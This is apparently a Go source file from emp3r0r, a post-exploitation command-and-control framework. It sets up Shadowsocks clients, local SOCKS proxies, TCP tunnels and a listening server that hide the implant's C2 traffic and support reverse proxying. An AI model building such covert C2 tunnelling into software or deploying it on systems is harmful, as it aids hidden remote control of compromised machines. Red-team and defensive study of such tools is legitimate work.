package c2transport

import (
	"context"
	"fmt"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

// SS_Ctx, SS_Cancel context for Shadowsocks client, call SS_Cancel() to stop existing Shadowsocks client
var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())

func startShadowsocksClient(ss_serverAddr, localSocksAddr, tcptun string) {
	ss_config := createSSConfig(ss_serverAddr, localSocksAddr, tcptun, false)
	err := transport.SSMain(ss_config)
	if err != nil {
		logging.Printf("ShadowsocksProxy failed to start: %v", err)
		return
	}

	defer func() {
		logging.Printf("Shadowsocks client (%v) exited", ss_config)
		ss_config.Cancel()
	}()

	for ss_config.Ctx.Err() == nil {
		time.Sleep(time.Second)
	}
}

func createSSConfig(serverAddr, localSocksAddr, tcptun string, isServer bool) *transport.SSConfig {
	return &transport.SSConfig{
		ServerAddr:     serverAddr,
		LocalSocksAddr: localSocksAddr,
		Cipher:         transport.SSAEADCipher,
		Password:       common.RuntimeConfig.Password,
		IsServer:       isServer,
		Verbose:        false,
		TCPTun:         tcptun,
		Ctx:            SS_Ctx,
		Cancel:         SS_Cancel,
	}
}

// Start shadowsocksC2Client client, you get a SOCKS5 proxy server at 127.0.0.1:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func shadowsocksC2Client() {
	ss_server_port := common.RuntimeConfig.ShadowsocksServerPort
	ss_server_addr := common.RuntimeConfig.CCAddress
	if common.RuntimeConfig.UseKCP {
		logging.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
		ss_server_port = common.RuntimeConfig.KCPClientPort
		ss_server_addr = "127.0.0.1"
	} else {
		logging.Printf("C2 traffic will go through Shadowsocks: %s:%s",
			common.RuntimeConfig.CCAddress,
			common.RuntimeConfig.ShadowsocksServerPort)
	}

	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
	local_socks_addr := "127.0.0.1:" + common.RuntimeConfig.ShadowsocksLocalSocksPort

	startShadowsocksClient(server_addr, local_socks_addr, "")
}

// StartLocalSocks client, you get a SOCKS5 proxy server at lport
func StartLocalSocks(ss_server, lport string) {
	logging.Printf("StartLocalSocks: %s:%s", ss_server, lport)
	ss_server_port := common.RuntimeConfig.ShadowsocksServerPort
	ss_server_ip := ss_server

	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)

	local_socks_addr := "127.0.0.1:" + lport
	startShadowsocksClient(ss_server_addr, local_socks_addr, "")
}

// Start shadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
// tcptun: "local_port=remote_host:remote_port,local_port=remote_host:remote_port"
func shadowsocksTCPTunnel(ss_server, lport, raddr string) {
	ss_server_port := common.RuntimeConfig.ShadowsocksServerPort
	ss_server_ip := ss_server

	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)

	tcptun := fmt.Sprintf("127.0.0.1:%s=%s", lport, raddr)
	startShadowsocksClient(ss_server_addr, "", tcptun)
}

// Start Shadowsocks proxy server with common.RuntimeConfig.ShadowsocksPassword
// This server will serve as a secure tunnel that encapsulates SOCKS5 service provider
// for both broadcasted proxy server and `bring2cc` SSH reverse proxy
func RunSSServer() error {
	ctx, cancel := context.WithCancel(context.Background())
	ss_config := createSSConfig("0.0.0.0:"+common.RuntimeConfig.ShadowsocksServerPort, "", "", true)
	ss_config.Ctx = ctx
	ss_config.Cancel = cancel

	// start server
	logging.Printf("Shadowsocks Server: %v", ss_config)

	err := transport.SSMain(ss_config)
	if err != nil {
		return fmt.Errorf("shadowsocksServer: %v", err)
	}

	return nil
}
